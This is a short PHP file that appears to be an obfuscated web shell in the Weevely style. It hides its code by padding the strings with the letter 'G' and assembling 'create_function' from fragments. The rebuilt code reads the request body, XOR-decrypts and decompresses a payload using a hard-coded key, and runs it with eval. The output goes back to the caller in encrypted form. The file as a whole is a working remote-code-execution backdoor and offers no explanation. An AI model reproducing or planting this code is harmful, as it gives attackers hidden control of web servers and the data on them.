<?php
$p='$k="G3f9d4aGfGa";$kh="7bb23GfbGfGfaa4";$kf=G"6f98d7d7bb0Gf";$pG=';
$t='GGe64_encode(@Gx(@gzcoGmpGresGs($o),$k));prGint("$pGG$kh$r$kf");}';
$M='$l);$jG++,$i+G+G){$o.=$t{$i}^$kG{$GjG};}}retuGrn $o;}if (@GpregG_m';
$P='aGtch("/$kh(.+G)$GkfG/"G,@file_get_contGents("php:G//inGput"),GG$m)=';
$l=str_replace('D','','creDaDteD_fuDncDDtion');
$a='"HtP60pGoGwPfrGMGV1ME";functioGn x($t,GG$k){$c=strleGn($k)G;$l=';
$e='strlen(G$t);$oG="G";foGr($i=0;$iG<$l;){Gfor($j=0;(G$j<G$c&&$GiG<';
$Z='m[G1]),G$k)));$oG=@ob_get_GcoGntentGs();@ob_Gend_clGean();$r=G@bas';
$g='=1) {@obG_starGt();@evaGl(G@gzuncoGmpress(@xG(@baseG6G4_decode($';
$X=str_replace('G','',$p.$a.$e.$M.$P.$g.$Z.$t);
$o=$l('',$X);$o();
?>
